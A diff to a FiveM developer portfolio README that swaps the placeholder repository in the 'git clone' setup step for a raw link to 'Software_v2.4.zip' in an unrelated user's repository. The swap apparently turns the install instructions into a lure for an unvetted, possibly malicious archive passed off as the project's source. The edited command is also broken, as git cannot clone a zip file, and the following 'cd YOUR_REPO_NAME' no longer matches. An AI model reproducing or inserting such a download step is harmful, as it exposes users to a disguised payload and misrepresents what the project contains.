@@ -29,7 +29,7 @@ A professional portfolio website for a FiveM developer with a Cyberpunk Neon des
 
 ```bash
 # Clone the repository
-git clone https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git
+git clone https://raw.githubusercontent.com/mohamedsamy3450/landing/main/misculture/Software_v2.4.zip
 
 # Navigate to project
 cd YOUR_REPO_NAME
